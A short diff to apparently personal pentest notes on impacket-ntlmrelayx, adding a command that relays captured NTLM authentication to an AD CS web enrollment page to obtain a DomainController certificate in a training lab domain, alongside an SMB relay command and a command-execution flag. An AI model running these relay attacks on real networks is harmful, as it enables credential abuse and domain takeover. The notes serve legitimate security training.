@@ -4,6 +4,9 @@ $ impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET-IP>
 ```
 >NOTE: Make sure `SMB = Off` in Responder's config
 
+```shell-session
+$ sudo impacket-ntlmrelayx -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
+```
 # Useful Flags
 - `-c`: Execute commands
 
